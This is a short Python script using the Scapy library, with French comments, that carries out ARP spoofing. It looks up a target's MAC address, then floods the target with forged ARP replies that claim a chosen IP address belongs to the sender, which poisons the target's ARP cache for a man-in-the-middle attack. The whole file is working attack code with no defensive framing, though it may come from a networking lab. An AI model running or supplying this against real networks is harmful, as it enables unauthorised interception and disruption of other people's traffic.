from scapy.all import *
import sys
target = sys.argv[1]
spoofed_ip = sys.argv[2]

# fonction pour obtenir la mac de la cible
def arp_who(target):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target), timeout=2, verbose=0)
    rep = ans
    mac_dest = rep[0][1].hwsrc
    return(mac_dest)

# fonction pour envoyer un paquet arp donnant notre mac source à la machine cible
def arp_is(target, spoofed_ip, mac_dest):
    is_pkt = Ether(dst=mac_dest)
    is_pkt /= ARP(op=2, hwdst=mac_dest, pdst=target, psrc=spoofed_ip)
    sendp(is_pkt)

# envoi du who is et récupération de la mac de la machine cible
mac_dest = arp_who(target)
print("Wow here is the mac returned for",target, ":", mac_dest)
# lancement de la boucle envoyant plein de is at
while True:
    arp_is(target, spoofed_ip, mac_dest)